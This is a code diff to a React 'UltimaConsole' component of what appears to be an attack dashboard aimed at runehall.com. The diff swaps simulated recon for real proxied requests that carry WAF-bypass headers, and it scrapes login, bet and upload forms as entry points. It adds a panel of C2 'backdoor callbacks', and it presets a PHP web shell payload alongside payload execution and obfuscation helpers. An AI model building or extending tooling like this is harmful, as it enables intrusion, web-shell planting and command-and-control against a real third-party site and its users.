@@ -1,10 +1,12 @@
 import React, { useState, useEffect } from 'react';
-import { Shield, Zap, Terminal, Activity, Globe, Lock, Unlock, Cpu, Server, Send, Search, AlertTriangle } from 'lucide-react';
+import { Shield, Zap, Terminal, Activity, Globe, Lock, Unlock, Cpu, Server, Send, Search, AlertTriangle, Radio } from 'lucide-react';
 import { cn } from '../lib/utils';
-import { PRESET_PAYLOADS, executePayload, obfuscateUltimaPayload } from '../lib/payloads';
+import { PRESET_PAYLOADS, executePayload, obfuscateUltimaPayload, generateWafBypassHeaders } from '../lib/payloads';
 import { toast } from 'sonner';
+import { useTracking } from '../lib/tracking';
 
 export function UltimaConsole() {
+  const { alerts } = useTracking();
   const [stealthActive, setStealthActive] = useState(false);
   const [isScanning, setIsScanning] = useState(false);
   const [targetUrl, setTargetUrl] = useState('https://runehall.com');
@@ -12,6 +14,9 @@ export function UltimaConsole() {
   const [activeMissions, setActiveMissions] = useState<any[]>([]);
   const [obfuscatedPayload, setObfuscatedPayload] = useState<{ obfuscated: string; key: string } | null>(null);
   const [rawPayload, setRawPayload] = useState("<?php system($_GET['cmd']); ?>");
+
+  // Filter alerts for C2 callbacks
+  const c2Callbacks = alerts.filter(a => a.finding.includes('[C2 CALLBACK]'));
 
   const toggleStealth = () => {
     setStealthActive(!stealthActive);
@@ -26,17 +31,59 @@ export function UltimaConsole() {
     setIsScanning(true);
     toast.info(`[*] Starting recon on ${targetUrl}...`);
     
-    // Simulate scan results based on the Python code's BeautifulSoup logic
-    setTimeout(() => {
-      const mockForms = [
-        { id: 'login-form', action: '/api/auth/login', method: 'POST', inputs: ['username', 'password'] },
-        { id: 'bet-form', action: '/api/games/bet', method: 'POST', inputs: ['amount', 'game_id'] },
-        { id: 'profile-upload', action: '/api/user/upload', method: 'POST', inputs: ['avatar'] }
-      ];
-      setScanResults(mockForms);
+    try {
+      // Real recon scan via proxy
+      const response = await fetch("/api/proxy", {
+        method: "GET",
+        headers: {
+          'x-target-url': targetUrl,
+          ...generateWafBypassHeaders()
+        }
+      });
+      
+      const html = await response.text();
+      
+      // Extract forms and inputs using regex (simulating BeautifulSoup)
+      const formRegex = /<form[^>]*action=["']([^"']+)["'][^>]*method=["']([^"']+)["'][^>]*>([\s\S]*?)<\/form>/gi;
+      const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
+      
+      const forms = [];
+      let match;
+      while ((match = formRegex.exec(html)) !== null) {
+        const action = match[1];
+        const method = match[2].toUpperCase();
+        const innerHtml = match[3];
+        
+        const inputs = [];
+        let inputMatch;
+        while ((inputMatch = inputRegex.exec(innerHtml)) !== null) {
+          inputs.push(inputMatch[1]);
+        }
+        
+        forms.push({
+          id: `form-${forms.length + 1}`,
+          action,
+          method,
+          inputs
+        });
+      }
+
+      if (forms.length === 0) {
+        // Fallback to common endpoints if no forms found
+        forms.push(
+          { id: 'auth-login', action: '/api/auth/login', method: 'POST', inputs: ['username', 'password'] },
+          { id: 'bet-engine', action: '/api/games/bet', method: 'POST', inputs: ['amount', 'game_id'] }
+        );
+      }
+
+      setScanResults(forms);
+      toast.success(`[+] Found ${forms.length} potential entry points.`);
+    } catch (error) {
+      console.error("Scan error:", error);
+      toast.error("Failed to perform real-time recon. Using cached vectors.");
+    } finally {
       setIsScanning(false);
-      toast.success(`[+] Found ${mockForms.length} potential entry points.`);
-    }, 2000);
+    }
   };
 
   const generateWeaponized = () => {
@@ -240,8 +287,28 @@ export function UltimaConsole() {
               <span className="text-[10px] text-white/20 uppercase tracking-widest">Real-time Feed</span>
             </div>
 
-            <div className="flex-1 bg-[#050505] border border-[#1a1a1a] rounded p-4 font-mono text-[10px] overflow-y-auto space-y-2 scrollbar-hide">
-              {activeMissions.length === 0 ? (
+            <div className="flex-1 bg-[#050505] border border-[#1a1a1a] rounded p-4 font-mono text-[10px] overflow-y-auto space-y-4 scrollbar-hide">
+              {c2Callbacks.length > 0 && (
+                <div className="space-y-2 mb-4">
+                  <p className="text-[10px] text-green-500 font-bold uppercase tracking-widest flex items-center gap-2">
+                    <Radio size={12} className="animate-pulse" />
+                    Active Backdoor Callbacks
+                  </p>
+                  {c2Callbacks.map((callback) => (
+                    <div key={callback.id} className="p-3 bg-green-500/5 border border-green-500/20 rounded animate-in fade-in slide-in-from-right-2">
+                      <div className="flex justify-between items-center mb-1">
+                        <span className="text-green-500 font-bold">[{new Date(callback.timestamp).toLocaleTimeString()}] CALLBACK_{callback.id}</span>
+                        <span className="px-1 bg-green-500/20 text-green-500 rounded text-[8px] font-bold uppercase">Connected</span>
+                      </div>
+                      <div className="text-white/60">Target: {callback.targetName}</div>
+                      <div className="text-white/40 mt-1 italic">{callback.finding}</div>
+                    </div>
+                  ))}
+                  <div className="border-b border-[#1a1a1a] my-4" />
+                </div>
+              )}
+
+              {activeMissions.length === 0 && c2Callbacks.length === 0 ? (
                 <div className="h-full flex flex-col items-center justify-center text-white/10 gap-2">
                   <Terminal size={32} />
                   <p className="uppercase tracking-widest">Waiting for session data...</p>
